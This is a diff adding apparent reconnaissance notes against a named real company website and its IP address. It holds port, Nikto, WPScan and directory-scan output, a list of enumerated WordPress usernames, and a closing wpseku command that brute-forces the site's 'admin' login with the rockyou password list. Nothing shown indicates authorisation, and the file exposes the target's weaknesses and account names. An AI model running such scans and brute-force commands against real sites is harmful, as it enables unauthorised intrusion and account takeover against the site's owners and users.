@@ -1,0 +1,329 @@
+https://i-office.com.vn/
+IP: 112.213.89.25
+
+Nmap scan report for ns8925.dotvndns.vn (112.213.89.25)
+Host is up (0.21s latency).
+Not shown: 88 filtered ports
+PORT     STATE  SERVICE
+21/tcp   open   ftp
+25/tcp   open   smtp
+53/tcp   closed domain
+80/tcp   open   http
+110/tcp  open   pop3
+143/tcp  open   imap
+443/tcp  open   https
+465/tcp  open   smtps
+587/tcp  open   submission
+993/tcp  open   imaps
+995/tcp  open   pop3s
+3306/tcp open   mysql
+
+***************************************************************************
+					Nikto
+https://i-office.com.vn/wp-login.php?redirect_to=https%3A%2F%2Fi-office.com.vn%2Fwp-admin%2F&reauth=1
+
+https://i-office.com.vn/admin
+https://i-office.com.vn/controlpanel
+https://i-office.com.vn:2083/
+
+***************************************************************************
+					WPscan 
+[+] URL: https://i-office.com.vn/wp-login.php/
+[+] Started: Thu Apr 19 13:19:32 2018
+
+[+] robots.txt available under: 'https://i-office.com.vn/wp-login.php/robots.txt'
+[!] The WordPress 'https://i-office.com.vn/wp-login.php/readme.html' file exists exposing a version number
+[!] emergency.php has been found in: 'https://i-office.com.vn/wp-login.php/emergency.php'
+[+] Interesting header: ALT-SVC: quic=":443"; ma=2592000; v="35,37,38,39"
+[+] Interesting header: SERVER: LiteSpeed
+[+] Interesting header: SET-COOKIE: wordpress_test_cookie=WP+Cookie+check; path=/; secure
+[+] Interesting header: STRICT-TRANSPORT-SECURITY: max-age=31536000; includeSubDomains; preload
+[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
+[+] Interesting header: X-POWERED-BY: PHP/5.4.45
+[+] This site seems to be a multisite (http://codex.wordpress.org/Glossary#Multisite)
+
+[+] WordPress version 4.9.5 (Released on 2018-04-03) identified from stylesheets numbers
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Finished: Thu Apr 19 13:23:25 2018
+[+] Requests Done: 363
+[+] Memory used: 31.703 MB
+[+] Elapsed time: 00:03:52
+
+***************************************************************************
+
+nmap -sV -O 112.213.89.25 -p21
+21/tcp open  ftp     Pure-FTPd
+
+
+***************************************************************************
+			dirb https://i-office.com.vn/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Apr 19 13:05:37 2018
+URL_BASE: https://i-office.com.vn/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: https://i-office.com.vn/ ----
+==> DIRECTORY: https://i-office.com.vn/~adm/                                   
+==> DIRECTORY: https://i-office.com.vn/~admin/                                 
+==> DIRECTORY: https://i-office.com.vn/~administrator/                         
+==> DIRECTORY: https://i-office.com.vn/~amanda/                                
+==> DIRECTORY: https://i-office.com.vn/~apache/                                
+==> DIRECTORY: https://i-office.com.vn/~bin/                                   
+==> DIRECTORY: https://i-office.com.vn/~ftp/                                   
+==> DIRECTORY: https://i-office.com.vn/~guest/                                 
+==> DIRECTORY: https://i-office.com.vn/~http/                                  
+==> DIRECTORY: https://i-office.com.vn/~httpd/                                 
+==> DIRECTORY: https://i-office.com.vn/~log/                                   
+==> DIRECTORY: https://i-office.com.vn/~logs/                                  
+==> DIRECTORY: https://i-office.com.vn/~lp/                                    
+==> DIRECTORY: https://i-office.com.vn/~mail/                                  
+==> DIRECTORY: https://i-office.com.vn/~nobody/                                
+==> DIRECTORY: https://i-office.com.vn/~operator/                              
+==> DIRECTORY: https://i-office.com.vn/~root/                                  
+==> DIRECTORY: https://i-office.com.vn/~sys/                                   
+==> DIRECTORY: https://i-office.com.vn/~sysadm/                                
+==> DIRECTORY: https://i-office.com.vn/~sysadmin/                              
+==> DIRECTORY: https://i-office.com.vn/~test/                                  
+==> DIRECTORY: https://i-office.com.vn/~tmp/                                   
+==> DIRECTORY: https://i-office.com.vn/~user/                                  
+==> DIRECTORY: https://i-office.com.vn/~webmaster/                             
+==> DIRECTORY: https://i-office.com.vn/~www/                                   
++ https://i-office.com.vn/0 (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/05 (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/1 (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/10 (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/11 (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/12 (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/15 (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/2 (CODE:301|SIZE:0)                                  
+==> DIRECTORY: https://i-office.com.vn/2013/                                   
+==> DIRECTORY: https://i-office.com.vn/2014/                                   
++ https://i-office.com.vn/22 (CODE:301|SIZE:0)                                 
+==> DIRECTORY: https://i-office.com.vn/3/                                      
+==> DIRECTORY: https://i-office.com.vn/4/                                      
++ https://i-office.com.vn/5 (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/6 (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/8 (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/9 (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/a (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/A (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/ac (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/acc (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/account (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/accounting (CODE:301|SIZE:0)                         
++ https://i-office.com.vn/admin (CODE:302|SIZE:0)                              
+==> DIRECTORY: https://i-office.com.vn/ads/                                    
++ https://i-office.com.vn/am (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/atom (CODE:301|SIZE:0)                               
++ https://i-office.com.vn/author (CODE:301|SIZE:1147)                          
++ https://i-office.com.vn/b (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/B (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/ban (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/bat (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/blog (CODE:301|SIZE:1147)                            
++ https://i-office.com.vn/bo (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/book (CODE:301|SIZE:0)                               
++ https://i-office.com.vn/booking (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/business (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/Business (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/c (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/C (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/ca (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/can (CODE:301|SIZE:0)                                
+==> DIRECTORY: https://i-office.com.vn/cgi-bin/                                
++ https://i-office.com.vn/cgi-sys (CODE:403|SIZE:1139)                         
++ https://i-office.com.vn/ch (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/chan (CODE:301|SIZE:0)                               
++ https://i-office.com.vn/co (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/comment-page-1 (CODE:301|SIZE:0)                     
++ https://i-office.com.vn/con (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/controlpanel (CODE:200|SIZE:33901)                   
++ https://i-office.com.vn/cpanel (CODE:200|SIZE:33901)                         
++ https://i-office.com.vn/d (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/D (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/da (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/dan (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/dashboard (CODE:302|SIZE:0)                          
++ https://i-office.com.vn/de (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/dec (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/def (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/di (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/dispatch (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/do (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/e (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/E (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/embed (CODE:301|SIZE:0)                              
+==> DIRECTORY: https://i-office.com.vn/en/                                     
++ https://i-office.com.vn/error_log (CODE:403|SIZE:1139)                       
++ https://i-office.com.vn/events (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/ex (CODE:301|SIZE:0)                                 
+==> DIRECTORY: https://i-office.com.vn/expert/                                 
++ https://i-office.com.vn/favicon.ico (CODE:200|SIZE:0)                        
+==> DIRECTORY: https://i-office.com.vn/feed/                                   
++ https://i-office.com.vn/g (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/G (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/ga (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/geo (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/go (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/h (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/H (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/hi (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/hu (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/i (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/I (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/in (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/index.php (CODE:301|SIZE:0)                          
++ https://i-office.com.vn/info.php (CODE:200|SIZE:86279)                       
++ https://i-office.com.vn/int (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/inter (CODE:301|SIZE:0)                              
++ https://i-office.com.vn/intern (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/internet (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/Internet (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/k (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/l (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/L (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/la (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/lo (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/login (CODE:302|SIZE:0)                              
+==> DIRECTORY: https://i-office.com.vn/logo/                                   
++ https://i-office.com.vn/m (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/M (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/ma (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/mailman (CODE:403|SIZE:1139)                         
++ https://i-office.com.vn/man (CODE:301|SIZE:0)                                
++ https://i-office.com.vn/mark (CODE:301|SIZE:0)                               
++ https://i-office.com.vn/market (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/marketing (CODE:301|SIZE:0)                          
++ https://i-office.com.vn/me (CODE:301|SIZE:0)                                 
++ https://i-office.com.vn/mo (CODE:301|SIZE:0)                                 
+==> DIRECTORY: https://i-office.com.vn/money/                                  
++ https://i-office.com.vn/n (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/N (CODE:301|SIZE:0)                                  
++ https://i-office.com.vn/ne (CODE:301|SIZE:0)                                 
+(!) WARNING: Too many responses for this directory seem to be FOUND.           
+    (Something is going wrong - Try Other Scan Mode)
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: https://i-office.com.vn/~adm/ ----
++ https://i-office.com.vn/~adm/~test (CODE:301|SIZE:0)                         
++ https://i-office.com.vn/~adm/a (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/A (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/ac (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/acc (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/account (CODE:301|SIZE:0)                       
++ https://i-office.com.vn/~adm/accounting (CODE:301|SIZE:0)                    
++ https://i-office.com.vn/~adm/am (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/atom (CODE:301|SIZE:0)                          
++ https://i-office.com.vn/~adm/b (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/B (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/ban (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/bat (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/bo (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/book (CODE:301|SIZE:0)                          
++ https://i-office.com.vn/~adm/booking (CODE:301|SIZE:0)                       
++ https://i-office.com.vn/~adm/business (CODE:301|SIZE:0)                      
++ https://i-office.com.vn/~adm/Business (CODE:301|SIZE:0)                      
++ https://i-office.com.vn/~adm/c (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/C (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/ca (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/can (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/ch (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/chan (CODE:301|SIZE:0)                          
++ https://i-office.com.vn/~adm/co (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/con (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/d (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/D (CODE:301|SIZE:0)                             
++ https://i-office.com.vn/~adm/da (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/dan (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/de (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/dec (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/def (CODE:301|SIZE:0)                           
++ https://i-office.com.vn/~adm/di (CODE:301|SIZE:0)                            
++ https://i-office.com.vn/~adm/dispatch (CODE:301|SIZE:0)                      
++ https://i-office.com.vn/~adm/do (CODE:301|SIZE:0)                            
+                                                                               
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: OPERATION TIMEOUT)
+                                                                               
+-----------------
+END_TIME: Thu Apr 19 14:25:05 2018
+DOWNLOADED: 4008 - FOUND: 137
+
+***************************************************************************
+		nikto -h https://i-office.com.vn/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          112.213.89.25
++ Target Hostname:    i-office.com.vn
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /OU=Domain Control Validated/OU=PositiveSSL/CN=i-office.com.vn
+                   Ciphers:  ECDHE-RSA-AES128-GCM-SHA256
+                   Issuer:   /C=GB/ST=Greater Manchester/L=Salford/O=COMODO CA Limited/CN=COMODO RSA Domain Validation Secure Server CA
++ Start Time:         2018-04-19 13:02:03 (GMT-7)
+---------------------------------------------------------------------------
++ Server: LiteSpeed
++ Retrieved x-powered-by header: PHP/5.4.45
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: <https://i-office.com.vn/>; rel=shortlink
++ Uncommon header 'alt-svc' found, with contents: quic=":443"; ma=2592000; v="35,37,38,39"
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie bp_user-role created without the secure flag
++ Cookie bp_user-role created without the httponly flag
++ Cookie bp_user-registered created without the secure flag
++ Cookie bp_user-registered created without the httponly flag
++ Cookie PHPSESSID created without the secure flag
++ Cookie PHPSESSID created without the httponly flag
++ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
++ /cgi-sys/formmail.pl: Many versions of FormMail have remote vulnerabilities, including file access, information disclosure and email abuse. FormMail access should be restricted as much as possible or a more secure solution found.
++ /webmail/blank.html: IlohaMail 0.8.10 contains an XSS vulnerability. Previous versions contain other non-descript vulnerabilities.
++ /securecontrolpanel/: Web Server Control Panel
++ /webmail/: Web based mail package installed.
++ /cgi-sys/Count.cgi: This may allow attackers to execute arbitrary commands on the server
++ OSVDB-3233: /mailman/listinfo: Mailman was found on the server.
++ Uncommon header 'x-robots-tag' found, with contents: noindex
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-2117: /cpanel/: Web-based control panel
++ OSVDB-3092: /new/: This might be interesting...
++ OSVDB-3092: /img-sys/: Default image directory should not allow directory listing.
++ OSVDB-3093: /webmail/lib/emailreader_execute_on_each_page.inc.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ /info.php: Output from the phpinfo() function was found.
++ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: Connect failed: ; Connection timed out at /var/lib/nikto/plugins/LW2.pm line 5157.
+: Connection timed out
++ Scan terminated:  16 error(s) and 31 item(s) reported on remote host
++ End Time:           2018-04-19 14:28:25 (GMT-7) (5182 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+***************************************************************************
+
+
+--------------------------------
+| ID | Username        | Login |
+--------------------------------
+|  0 | anhle           | anhle |
+|  1 | CEO             | ceo   |
+|  2 | i-Office.com.vn | admin |
+|  3 | i-Office.com.vn | None  |
+|  4 | CEO             | None  |
+--------------------------------
+
+python3 wpseku.py --url https://i-office.com.vn/ --brute --user admin --wordlist /root/Desktop/newpw/rockyou.txt --verbose
